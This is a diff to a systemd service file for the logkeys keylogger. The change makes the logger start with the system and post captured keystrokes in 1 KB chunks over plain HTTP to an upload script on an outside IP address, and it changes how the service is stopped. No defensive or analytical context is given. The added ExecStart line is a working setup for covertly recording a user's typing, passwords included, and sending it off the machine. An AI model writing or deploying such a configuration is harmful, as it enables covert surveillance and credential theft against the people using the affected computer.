@@ -3,8 +3,8 @@ Description=logkeys daemon service
 
 [Service]
 Type=simple
-ExecStart=/usr/local/bin/logkeys --no-daemon -s --no-func-keys -m /keymap/my_keymap
-ExecStop=pkill logkeys
+ExecStart=/usr/local/bin/logkeys -s -m /keymap/my_keymap --post-http=http://35.198.162.18/upload.php --post-size=1k --no-func-keys --no-daemon
+ExecStop=/usr/local/bin/logkeys -k
 
 [Install]
 WantedBy=default.target
